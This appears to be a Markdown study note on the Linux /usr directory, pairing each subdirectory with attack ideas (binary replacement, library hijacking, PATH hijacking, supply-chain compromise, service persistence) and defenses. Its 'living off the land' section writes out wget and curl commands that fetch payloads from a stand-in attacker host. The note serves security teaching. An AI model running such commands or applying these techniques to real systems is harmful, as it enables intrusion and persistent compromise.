# 📁 usr.md — The `/usr` Directory 

## 🧠 What `/usr` REALLY is

`/usr` contains **user-space programs, libraries, and data**

👉 It is NOT just for users
👉 It is where **most system software actually lives**

---

## 🧠 Key Idea

* `/bin` → minimal essential tools
* `/usr` → full system functionality

---

👉 `/usr` = **main operating environment**

---

# 🏗️ STRUCTURE OF `/usr`

```id="8y2kxp"
/usr/bin
/usr/sbin
/usr/lib
/usr/share
/usr/local
```

---

# 🔐 1. `/usr/bin` — MAIN EXECUTION LAYER

## 🧠 What it is

Contains most user commands

---

## ⚙️ Examples

```id="w2k9xp"
/usr/bin/python
/usr/bin/git
/usr/bin/nmap
/usr/bin/wget
```

---

## 🧠 How it works

When you type:

```bash id="v4k2xp"
python
```

System finds:

```id="y7m3zp"
/usr/bin/python
```

---

## 🔐 ATTACK: BINARY REPLACEMENT

### Step-by-step:

1. Attacker replaces:

```id="q9p2xm"
/usr/bin/python
```

2. With malicious version

---

### Result:

* Every script using python is compromised
* Code execution inside trusted programs

---

👉 Silent and powerful

---

## 🛡️ Defense

* Verify package integrity
* Restrict write access

---

# 🔐 2. `/usr/sbin` — SYSTEM BINARIES

## 🧠 What it is

Like `/sbin`, but non-essential system tools

---

## ⚙️ Examples

```id="c8m4xp"
/usr/sbin/apache2
/usr/sbin/nginx
/usr/sbin/useradd
```

---

## 🔐 ATTACK

Replace service binary:

```id="m2p7zn"
/usr/sbin/nginx
```

---

### Result:

* Malicious web server
* Backdoor access

---

👉 High-impact persistence

---

# 🔐 3. `/usr/lib` — LIBRARIES

## 🧠 What it is

Libraries used by `/usr/bin` programs

---

## 🔐 ATTACK: LIBRARY HIJACKING

Same as `/lib`, but affects:

* Applications
* Tools

---

### Example:

Replace:

```id="p5k8zm"
/usr/lib/libssl.so
```

---

### Result:

* Intercept encrypted communication
* Steal credentials

---

## 🛡️ Defense

* Monitor library integrity
* Use signed packages

---

# 🔐 4. `/usr/share` — DATA FILES

## 🧠 What it is

Stores:

* Documentation
* Config templates
* Application data

---

## ⚙️ Example

```id="x3k9zp"
/usr/share/applications/
/usr/share/doc/
```

---

## 🔐 Attack Use

Modify scripts/templates:

* Inject malicious code
* Alter behavior of programs

---

👉 Less obvious attack surface

---

# 🔐 5. `/usr/local` — ADMIN-INSTALLED SOFTWARE

## 🧠 What it is

Used for:

* Manually installed programs
* Custom tools

---

## ⚙️ Example

```id="f8m2xp"
/usr/local/bin/
/usr/local/sbin/
```

---

## 🔐 Why this is HIGH RISK

* Not managed by package manager
* Often overlooked

---

## 🔐 ATTACK

Attacker places:

```id="z2m9xp"
/usr/local/bin/ls
```

---

If PATH prioritizes it:

```bash id="r6k3zp"
echo $PATH
```

---

👉 It executes instead of `/bin/ls`

---

## 🛡️ Defense

* Monitor `/usr/local`
* Verify PATH order

---

# 🔐 ATTACK 1: PATH HIJACKING (REALISTIC)

## 🧠 Example PATH

```id="n7k2xp"
/usr/local/bin:/usr/bin:/bin
```

---

## ⚙️ Attack

Place malicious binary in:

```id="u3k9zp"
/usr/local/bin
```

---

## Result:

* System executes attacker binary first

---

👉 Very common real-world attack

---

# 🔐 ATTACK 2: SOFTWARE SUPPLY CHAIN

## 🧠 Idea

Attacker compromises:

* Packages
* Updates
* Install scripts

---

## ⚙️ Example

User installs:

```bash id="y4m8xp"
pip install malicious-package
```

---

👉 Code gets placed in:

```id="g6k2zp"
/usr/lib
/usr/bin
```

---

## 🔐 Result

* System-wide compromise
* Persistent malware

---

## 🛡️ Defense

* Use trusted repositories
* Verify packages

---

# 🔐 ATTACK 3: LIVING OFF THE LAND (TOOLS)

## 🧠 Attackers use tools in `/usr/bin`

---

## ⚙️ Examples

```bash id="h9k2xp"
wget http://attacker/malware.sh
curl http://attacker/payload
python exploit.py
```

---

👉 No malware needed initially
👉 Uses built-in tools

---

## 🛡️ Defense

* Monitor command usage
* Restrict unnecessary tools

---

# 🔐 ATTACK 4: PERSISTENCE VIA SERVICES

## ⚙️ Example

Modify:

```id="q2k8zp"
/usr/sbin/service_binary
```

---

👉 Service runs automatically

---

## 🔐 Result

* Persistent execution
* Hard to detect

---

# ⚠️ WHY `/usr` IS CRITICAL

Because it contains:

* Most executables
* Most libraries
* Most tools

---

👉 It is the **largest attack surface**

---

# 🛡️ DEFENSE STRATEGY

---

## 1. Verify Packages

```bash id="p3k7xp"
dpkg -V
```

---

## 2. Monitor `/usr/local`

```bash id="k8m2zp"
ls -la /usr/local
```

---

## 3. Check PATH

```bash id="t5k9xp"
echo $PATH
```

---

## 4. Restrict Write Access

* Only root should modify `/usr`

---

## 5. Monitor Executables

* Look for unusual binaries

---

# 🧪 RECON COMMANDS

```bash id="z7k2xp"
ls -la /usr
ls -la /usr/bin
ls -la /usr/sbin
ls -la /usr/local
find /usr -type f -writable 2>/dev/null
```

---

# 🧠 FINAL MENTAL MODEL

* `/bin` → essential tools
* `/usr` → full ecosystem

---

👉 `/usr` is where Linux actually “lives”

---

# 📌 FINAL TRUTH

If attacker controls `/usr`:

* They control applications
* They control tools
* They control libraries
* They gain persistence

👉 `/usr` compromise = **userland domination**
